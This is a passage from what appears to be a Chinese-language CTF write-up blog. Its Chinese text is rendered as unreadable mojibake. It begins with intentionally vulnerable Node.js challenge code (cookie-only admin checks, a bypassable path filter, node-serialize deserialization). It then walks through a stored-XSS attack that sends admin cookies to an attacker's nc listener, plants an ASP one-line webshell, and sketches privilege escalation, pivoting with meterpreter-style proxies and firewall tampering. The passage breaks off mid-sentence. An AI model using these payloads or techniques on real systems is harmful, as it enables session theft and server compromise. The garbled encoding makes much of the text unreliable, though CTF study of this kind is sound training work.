punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>bd<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\'|http|\"|\`|cookie|&lt;|>|script</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">appendFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åå°ç®¡ç†</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">datadir</span> <span class="token operator">:</span> data_path        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>qweqwe<span class="token operator">=</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>qweqwe<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>qweqwe<span class="token operator">=</span>qweqwe<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>data_path <span class="token operator">=</span> qweqwe<span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å·²å¼ƒç”¨çš„ç™»å½•</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/login.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(funcion|require|exec|child_process)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> obj <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//QQ</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/qq'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> data_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="2022å¹´é»‘ç›¾xss-by-543"><a href="#2022å¹´é»‘ç›¾xss-by-543" class="headerlink" title="2022å¹´é»‘ç›¾xss by 543"></a>2022å¹´é»‘ç›¾xss by 543</h2><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/640" alt="å›¾ç‰‡"></p><p><strong>æ¸—é€è¿‡ç¨‹</strong></p><p><strong>ä¸€ã€ç›®å½•æ‰«æ</strong></p><p>ä½¿ç”¨å¾¡å‰‘ã€wwwscanä¹‹ç±»çš„å·¥å…·æ‰«æï¼Œæˆ–è€…äººå·¥çŒœæµ‹ï¼Œå¯ä»¥å‘ç°åå°è·¯å¾„&#x2F;admin&#x2F;ã€‚æŸ¥çœ‹ç½‘é¡µæºä»£ç ä¹Ÿèƒ½å‘ç°æ³¨é‡Šæ‰çš„åå°é“¾æ¥ï¼š</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/641" alt="å›¾ç‰‡"></p><p>è¿™é‡Œä¹Ÿæœ‰ä¸€å®šçš„æœºä¼šå‘ç°é»˜è®¤çš„accessæ•°æ®åº“æ–‡ä»¶&#x2F;ly.mdbï¼ˆä¸»è¦å–å†³äºå­—å…¸åº“æ˜¯å¦å¤Ÿä¸°å¯Œï¼Œä»¥åŠä½ çš„è¿æ°”æ˜¯å¦å¤Ÿå¥½ï¼‰ã€‚è¿™é‡Œä¸å‘ç°æ•°æ®åº“ä¹Ÿæ— æ‰€è°“ï¼Œåé¢çš„æ­¥éª¤ä¹Ÿèƒ½è·å–æ•°æ®åº“ã€‚æ‰“å¼€æ•°æ®åº“å¯å¾—ä¸€ä¸ªflagã€‚</p><p>å°è¯•è®¿é—®åå°&#x2F;admin&#x2F;ä¼šæç¤ºåªå…è®¸localhostæœ¬æœºè®¿é—®ï¼Œè¿™æ—¶æœ‰äº›äººä¼šå°è¯•ä¿®æ”¹HTTPå¤´çš„hostæˆ–XFFå­—æ®µå»è®¿é—®ï¼Œæ€ç»´æœ‰æ²¡é—®é¢˜ï¼Œä¸è¿‡è¿™ä¸€é¢˜çš„è€ƒç‚¹æ°å¥½ä¸åœ¨è¿™æ–¹é¢ã€‚</p><p><strong>äºŒã€è¡¨å•æµ‹è¯•å‘ç°è·¨ç«™è„šæœ¬æ¼æ´</strong></p><p>åœ¨ç•™è¨€è¡¨å•çš„æ ‡é¢˜æˆ–å†…å®¹ä¸­å¡«å†™ä¸€äº›payloadå°è¯•å‘½ä»¤æ‰§è¡Œã€ä»£ç æ‰§è¡Œã€è·¨ç«™è„šæœ¬ç­‰æ¼æ´ã€‚æäº¤åå†å»æŸ¥çœ‹ç•™è¨€å¯ä»¥å‘ç°jsè„šæœ¬ä¼šæ‰§è¡Œï¼Œè¯´æ˜æœ‰å­˜å‚¨å‹è·¨ç«™è„šæœ¬æ¼æ´ã€‚</p><p><strong>ä¸‰ã€è·¨ç«™è„šæœ¬XSSçªƒå–ç®¡ç†å‘˜cookies</strong></p><p>æ ¹æ®ç»éªŒï¼Œè·¨ç«™è„šæœ¬å¯ä»¥ç”¨æ¥çªƒå–ä»–äººçš„cookieså¹¶å‘é€åˆ°äº‹å…ˆå‡†å¤‡å¥½çš„æ¥æ”¶å¹³å°ä¸Šã€‚è¿™é‡Œæä¾›ä¸¤ç§æ¥æ”¶æ€è·¯ï¼š</p><h3 id="æ€è·¯ä¸€ï¼šæ­ä¸€ä¸ªå¹³å°æ¥æ”¶cookies"><a href="#æ€è·¯ä¸€ï¼šæ­ä¸€ä¸ªå¹³å°æ¥æ”¶cookies" class="headerlink" title="æ€è·¯ä¸€ï¼šæ­ä¸€ä¸ªå¹³å°æ¥æ”¶cookies"></a><strong>æ€è·¯ä¸€ï¼šæ­ä¸€ä¸ªå¹³å°æ¥æ”¶cookies</strong></h3><p>æ”»å‡»è€…åœ¨è‡ªå·±ç”µè„‘ä¸Šæ­ä¸€ä¸ªwebæœåŠ¡ï¼Œç”¨æ¥æ¥æ”¶ã€ä¿å­˜æ•°æ®ã€‚å¯ä»¥ç”¨ç½‘ä¸Šå¼€æºçš„ä¸€äº›å·¥å…·æ¥æ­å»ºç¯å¢ƒï¼Œæ¯”å¦‚ï¼šBlueLotus_XSSReceiverã€‚ä»£ç åŸºç¡€æ¯”è¾ƒå¥½çš„è¯ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªç¨‹åºæ¥æ¥æ”¶ã€‚</p><p>ä½†æˆ‘æœ‰æ›´ç®€å•çš„æ–¹æ¡ˆï¼Œå°±æ˜¯ç”¨ncï¼Œè¿™ä¸ªå°å·¥å…·å¤§å®¶æ›´ç†Ÿæ‚‰ï¼Œåªè¦ç”¨ä¸€æ¡å‘½ä»¤ç›‘å¬ç«¯å£å°±å¯ä»¥æ”¶æ•°æ®äº†ï¼šnc.exe -v -L -p 543</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/642" alt="å›¾ç‰‡"></p><p>åœ¨ç•™è¨€æœ¬ä¸Šæäº¤ä¸€æ®µjsè„šæœ¬è¯»å–cookieså¹¶åˆ›å»ºä¸€ä¸ª&lt;imgæ ‡ç­¾ï¼ˆä¹Ÿå¯ä»¥ç”¨&lt;scriptæ ‡ç­¾ï¼‰ï¼Œç”¨å…¶srcå±æ€§æ¥æŒ‡å‘æ¥æ”¶å¹³å°çš„URLï¼Œå¹¶æŠŠcookieså†…å®¹æ‹¼æ¥åˆ°URLçš„å‚æ•°ä¸­ã€‚ç®¡ç†å‘˜æµè§ˆç•™è¨€çš„æ—¶å€™å°±ä¼šæ‰§è¡Œä»£ç ï¼ŒæŠŠcookiesæäº¤ç»™æ¥æ”¶å¹³å°ã€‚ï¼ˆå†™jsæ¯”è¾ƒ666çš„è¯ï¼Œä½ ä¹Ÿå¯ä»¥è°ƒç”¨XMLHttpRequestå¯¹è±¡æŠŠcookieså‘å‡ºæ¥ï¼‰</p><p>ncä¼šæ”¶åˆ°å¦‚ä¸‹HTTPè¯·æ±‚æ•°æ®ï¼Œå¸¦cookieså†…å®¹ï¼š</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/643" alt="å›¾ç‰‡"></p><p>ç”±äºç•™è¨€ä¸­çš„ä»£ç ç”¨äº†escape(document.cookie)ï¼Œæ‰€ä»¥æ”¶åˆ°çš„å†…å®¹è¦è¿›è¡ŒURLDecodeè§£ç æ‰èƒ½æŠŠç‰¹æ®Šå­—ç¬¦è¿˜åŸã€‚</p><h3 id="æ€è·¯äºŒï¼šç›´æ¥æŠŠcookieså‘è¡¨æˆæ–°çš„ç•™è¨€"><a href="#æ€è·¯äºŒï¼šç›´æ¥æŠŠcookieså‘è¡¨æˆæ–°çš„ç•™è¨€" class="headerlink" title="æ€è·¯äºŒï¼šç›´æ¥æŠŠcookieså‘è¡¨æˆæ–°çš„ç•™è¨€"></a><strong>æ€è·¯äºŒï¼šç›´æ¥æŠŠcookieså‘è¡¨æˆæ–°çš„ç•™è¨€</strong></h3><p>ç”±äºç•™è¨€æœ¬å†…å®¹æ˜¯å…¬å¼€çš„ï¼Œå¯ä»¥å†™è„šæœ¬è·å–cookieså¹¶æ¨¡æ‹Ÿå¡«å†™è¡¨å•ï¼Œç›´æ¥æäº¤æˆä¸€æ¡æ–°çš„ç•™è¨€ã€‚è„šæœ¬ç¤ºä¾‹å¦‚å›¾ï¼š</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/644" alt="å›¾ç‰‡"></p><p>æäº¤ç•™è¨€ï¼Œç­‰ä¸€ä¼šæŸ¥çœ‹æœ€æ–°ç•™è¨€å°±èƒ½çœ‹åˆ°ç®¡ç†å‘˜å‘è¡¨å‡ºæ¥çš„cookiesæ•°æ®äº†ã€‚</p><h3 id="è·¨ç«™è„šæœ¬XSSè®¿é—®åå°å®ç°getshell"><a href="#è·¨ç«™è„šæœ¬XSSè®¿é—®åå°å®ç°getshell" class="headerlink" title="è·¨ç«™è„šæœ¬XSSè®¿é—®åå°å®ç°getshell"></a>è·¨ç«™è„šæœ¬XSSè®¿é—®åå°å®ç°getshell</h3><p>å‰é¢å‘ç°&#x2F;admin&#x2F;åªå…è®¸localhostè®¿é—®ã€‚å…¶å®ç”¨XSSå°±å¯ä»¥å®ç°ä»¥ç®¡ç†å‘˜çš„ä¼šè¯åœ¨æœ¬åœ°è®¿é—®åå°é¡µé¢ã€‚</p><p>ç•™è¨€æäº¤ä¸€æ®µJSä»£ç ï¼Œè°ƒç”¨XMLHttpRequestå¯¹è±¡ä»¥ajaxæ–¹å¼è®¿é—®åå°è·¯å¾„&#x2F;admin&#x2F;ï¼Œå¹¶æŠŠåå°é¡µé¢å“åº”çš„HTMLå‘é€å‡ºæ¥ï¼ˆè·Ÿæ¥æ”¶cookieä¸€æ ·çš„æ€è·¯ï¼‰ã€‚</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/645" alt="å›¾ç‰‡"></p><p>ncæ”¶åˆ°åå°ç½‘é¡µæºä»£ç ï¼šï¼ˆä¸­æ–‡ä¹±ç å¹¶ä¸å½±å“åˆ†æï¼‰<br><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/646" alt="å›¾ç‰‡"></p><p>å¯ä»¥è§‚å¯Ÿåˆ°åå°é¡µé¢ä¸»è¦æ˜¯å¤‡ä»½æ•°æ®åº“æ–‡ä»¶çš„åŠŸèƒ½ã€‚ï¼ˆæ­¤å¤„å¾—åˆ°äº†æ•°æ®åº“æ–‡ä»¶è·¯å¾„..&#x2F;ly.mdbï¼Œå¯ä»¥æ‹¼æ¥æˆURLä¸‹è½½ï¼Œæ‰“å¼€è·å–flagï¼‰</p><p>è¿›ä¸€æ­¥åˆ©ç”¨ï¼š</p><p>ç•™è¨€æ ‡é¢˜å†™ä¸Šä¸€å¥è¯æœ¨é©¬&lt;%eval request(â€œaâ€)%&gt;ï¼Œç•™è¨€å†…å®¹å†™è„šæœ¬è°ƒç”¨XMLHttpRequestå¯¹è±¡ä»¥ajaxæ–¹å¼æ¨¡æ‹Ÿæäº¤åå°å¤‡ä»½æ•°æ®åº“çš„è¡¨å•æ“ä½œï¼ŒæŠŠly.mdbå¤‡ä»½æˆä¸€ä¸ª*.aspæˆ–*.aspxçš„æ–‡ä»¶ï¼Œå°±å¾—åˆ°webshelläº†ã€‚è„šæœ¬ç¤ºä¾‹å¦‚å›¾ï¼š</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/647" alt="å›¾ç‰‡"></p><p>æäº¤ç•™è¨€ï¼Œç­‰ä¸€ä¼šå°±å¯ä»¥ç”¨ä¸­å›½èœåˆ€æˆ–cknifeä¹‹ç±»çš„å®¢æˆ·ç«¯è¿æ¥ä¸€å¥è¯æœ¨é©¬äº†ã€‚å¦‚å›¾ï¼š</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/648" alt="å›¾ç‰‡"></p><p>åœ¨Webæ ¹ç›®å½•è¿˜å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªflagæ–‡ä»¶ã€‚</p><p><strong>åç»­æ¸—é€ï¼š</strong></p><p>å¯ä»¥ä¸Šä¼ ææƒå·¥å…·ï¼Œè·å–SYSTEMæˆ–administratorçš„æƒé™ï¼ŒæŸ¥çœ‹ç®¡ç†å‘˜æ¡Œé¢ä¸Šçš„æ–‡ä»¶ï¼Œå‘ç°æœ‰ç®¡ç†é˜²ç«å¢™çš„ç¬”è®°å†…å®¹ï¼Œå¾—åˆ°é˜²ç«å¢™ç®¡ç†åå°ç™»å½•æƒï¼Œä¿®æ”¹é˜²ç«å¢™ç­–ç•¥å®ç°å†…ç½‘åŒºåŸŸçš„äº’é€šã€‚</p><p>æ ¹æ®å‰é¢å¾—åˆ°çš„æƒé™å’Œä¿¡æ¯ï¼Œå¯ä»¥è¿›è¡Œè·³æ¿æ”»å‡»ï¼Œå¯ä»¥ç”¨Tunnaæˆ–reDuhæˆ–meterpreterç­‰å·¥å…·æ­å»ºä»£ç†ï¼ŒæŠŠé˜²ç«å¢™çš„webç®¡ç†ç•Œé¢ä»£ç†å‡ºæ¥è®¿é—®ï¼Œå°è¯•ç™»å½•é˜²ç«å¢™åå°ç®¡ç†ã€‚</p><p><strong>é˜²ç«å¢™ä½œç”¨ä¸€ï¼š</strong>ä¿®æ”¹é˜²ç«å¢™è¿‡æ»¤è§„åˆ™ä½¿ä¸åŒç½‘ç»œåŒºåŸŸä¹‹é—´äº’é€šï¼Œå¯ä»¥ä½¿å†…ç½‘ç³»ç»Ÿè¢«è®¿é—®ã€‚</p><p><strong>é˜²ç«å¢™ä½œç”¨äºŒï¼š</strong>é˜²ç«å¢™å¯ä»¥ç”¨â€œç›®çš„åœ°å€è½¬æ¢â€åŠŸèƒ½å®ç°æŠŠå†…ç½‘IPã€ç«¯å£æ˜ 